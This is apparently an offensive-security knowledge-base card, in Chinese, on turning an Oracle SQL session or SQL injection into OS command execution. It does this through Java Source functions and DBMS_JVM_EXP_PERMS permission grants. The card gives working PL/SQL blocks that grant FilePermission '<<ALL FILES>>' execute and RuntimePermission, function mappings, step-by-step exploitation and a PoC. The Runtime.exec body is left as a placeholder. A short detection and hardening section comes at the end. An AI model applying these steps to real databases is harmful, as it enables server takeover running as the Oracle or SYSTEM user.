---
id: web-generic-sqli-oracle-java-source-dbms-jvm-exp-perms-command-exec
title: Oracle 高权限 SQL 会话下 Java Source 命令执行：DBMS_JVM_EXP_PERMS 授予 FilePermission/RuntimePermission
type: scenario
domain: web
path: web/generic/sqli
technique: oracle-java-source-dbms-jvm-exp-perms-command-exec
aliases:
- Oracle Java Source 命令执行
- DBMS_JVM_EXP_PERMS 授权
- IMPORT_JVM_PERMS
- Oracle JVM 权限授予
- language java 函数执行命令
tags:
- oracle
- java-source
- plsql
- rce
- jvm-permission
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V518
  verified_at: '2026-11-11T13:07:06+08:00'
  notes: 已对照原文与截图核对：CREATE OR REPLACE AND COMPILE JAVA SOURCE 语法、function say(...) language java 映射、DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY/IMPORT_JVM_PERMS 三段授权块（FilePermission、RuntimePermission writeFileDescriptor/readFileDescriptor）与原文逐字一致（图25-29）；图05显示 FilePermission 授权后 LinxRunCMD('whoami') 回显 nt authority\system，证明授权后 Java 命令执行成立。未验证点：PoC 用 Hello 示意，Runtime.exec 代码本体见既有 xmlquery 卡，未复跑；原文未给受影响版本。dedup_review 成立：既有 xmlquery 卡未覆盖 JVM 权限授予块，不同入口。
---

## 一句话结论

在 Oracle 中，只要账号具备 `CREATE PROCEDURE`/`CREATE JAVA SOURCE` 类权限（DBA 天然满足），就可以用 `CREATE OR REPLACE AND COMPILE JAVA SOURCE` 编写调用 `Runtime.getRuntime().exec()` 的 Java 类，再用 `CREATE FUNCTION ... LANGUAGE JAVA` 映射为 SQL 函数；默认 Java 沙箱会拒绝文件/进程相关操作，需要用 `DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY` + `IMPORT_JVM_PERMS` 为当前用户授予 `java.io.FilePermission`、`java.lang.RuntimePermission`（writeFileDescriptor/readFileDescriptor）后，`select` 调用函数即以 Oracle 进程用户执行系统命令。

## 原理

- **Oracle 内嵌 JVM**：Oracle 数据库自带 Java 虚拟机，`CREATE [OR REPLACE AND COMPILE] JAVA SOURCE NAMED "X" AS <Java 代码>` 会把 Java 源码编译为数据库内的 Java 对象；`CREATE FUNCTION f(...) RETURN ... AS LANGUAGE JAVA NAME 'X.method(java.lang.String) return String'` 建立 SQL 函数到 Java 静态方法的映射。
- **为什么调用会失败**：Oracle JVM 启用了 Java 安全管理器（Java 2 Security），代码默认没有 `java.io.FilePermission`、`java.lang.RuntimePermission` 等权限；调用 `Runtime.exec` 或文件操作会抛 `java.security.AccessControlException` / `ORA-29532`。
- **为什么授权后成立**：`DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS` 可以把策略条目导入 JVM 权限体系，条目形如 `('GRANT', USER(), 'SYS', 'java.io.FilePermission', '<<ALL FILES>>', 'execute', 'ENABLED')`。授予 `java.io.FilePermission <<ALL FILES>> execute` 后，`Runtime.exec` 才能派生进程；授予 `java.lang.RuntimePermission writeFileDescriptor/readFileDescriptor` 后，子进程的输入输出流才可读写。DBA 场景通常补一条 FilePermission 即可，缺哪个权限看报错补哪个。
- **执行身份**：命令由数据库 JVM 派生，运行身份是 Oracle 软件安装用户（常为 `oracle`），不是数据库 schema 用户。
- **高效语法**：`CREATE OR REPLACE AND COMPILE JAVA SOURCE` 会替换同名对象并立即编译，避免反复创建同名 Java Source 产生多条对象记录（普通 `CREATE JAVA SOURCE` 同名会报错）。

## 触发条件

- 已获得可执行任意 SQL/PLSQL 的 Oracle 会话（DBA 凭据、SQL 注入可堆叠执行、连接池凭据等）。
- 账号具备 `CREATE JAVA SOURCE`、`CREATE PROCEDURE`/`CREATE ANY PROCEDURE` 权限。
- Oracle JVM 已启用，`DBMS_JVM_EXP_PERMS` 可用。
- 能观察到函数返回值或命令外带信道。

## 利用步骤

1. 创建 Java Source（类含静态方法，内部用 `Runtime.getRuntime().exec` 执行命令并读回 stdout）：
   ```sql
   CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Hello" AS
     public class Hello {
       public static String say(String nothing) { return "Welcome World"; }
     }
   /
   ```
   实际利用时把方法体换成 `Runtime.exec` + 读取 `getInputStream()` 的代码。
2. 创建映射函数：`create or replace function say(nothing in varchar2) return varchar2 as language java name 'Hello.say(java.lang.String) return String'`。
3. 调用函数时若报权限错误，按报错补齐 JVM 权限（一条 PL/SQL 块对应一项）：
   ```sql
   DECLARE
     POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
     CURSOR C1 IS SELECT 'GRANT', USER(), 'SYS', 'java.io.FilePermission', '<<ALL FILES>>', 'execute', 'ENABLED' FROM DUAL;
   BEGIN
     OPEN C1;
     FETCH C1 BULK COLLECT INTO POL;
     CLOSE C1;
     DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
   END;
   /
   ```
   再按需为 `java.lang.RuntimePermission` 授予 `writeFileDescriptor`、`readFileDescriptor`。
4. 再次调用函数执行命令：`select say('whoami') from dual;`。
5. 通过 `select OBJECT_ID from all_objects where object_name ='Hello'` 校验 Java Source 对象是否创建成功；`DROP JAVA SOURCE "Hello"` 清理。

## PoC

```sql
-- 1. Java Source（示意：方法体内为 Runtime.exec 读取命令输出）
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Hello" AS
  public class Hello {
    public static String say(String nothing) {
      return "Welcome World"; }
  }
/
-- 2. SQL -> Java 映射
create or replace function say(nothing in varchar2) return varchar2
  as language java name 'Hello.say(java.lang.String) return String'
/
-- 3. 授予 FilePermission（缺 RuntimePermission 时按报错另补）
DECLARE
  POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
  CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.io.FilePermission','<<ALL FILES>>','execute','ENABLED' FROM DUAL;
BEGIN
  OPEN C1;
  FETCH C1 BULK COLLECT INTO POL;
  CLOSE C1;
  DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
-- 4. 调用
select say('asd') from dual;
```

## 变体与关联

- **注入单语句入口**：只允许单条 `select` 时，可借 `dbms_xmlquery.newcontext` 把 DDL 动态执行（见 [[web-generic-sqli-oracle-dbms-xmlquery-java-source-command-exec]]），或借 Java Source 写文件能力落地 so（见 [[web-generic-sqli-oracle-waf-java-source-write-so-library-rce]]）。
- **外部库路线**：`CREATE LIBRARY` + `LANGUAGE C` 直接走 extproc 原生进程，不受 Java 沙箱约束（见 [[web-generic-sqli-oracle-create-library-external-so-command-exec]]）。
- **授权形态**：`dbms_java.grant_permission('SYSTEM','SYS:java.io.FilePermission',...)` 是另一套授权接口，两者都可给当前 schema 增加 Java 权限。
- **同类**：Oracle `dbms_scheduler` 外部作业、`utl_http`/`utl_inaddr` 出网；跨库对手为 MSSQL CLR、PostgreSQL C 函数、MySQL UDF。

## 检测与防御

- **检测**：审计 `CREATE JAVA SOURCE`、`LANGUAGE JAVA` 函数、`DBMS_JVM_EXP_PERMS`/`dbms_java.grant_permission` 调用；监控 Oracle JVM 进程派生 `sh`/`cmd.exe` 子进程、异常出网。
- **防御**：业务账号最小权限，禁止 Java Source/存储过程创建；回收 `DBMS_JVM_EXP_PERMS`、`dbms_java` 包执行权限；数据库 JVM 安装可按需禁用；对 DDL 与权限授予做基线告警。
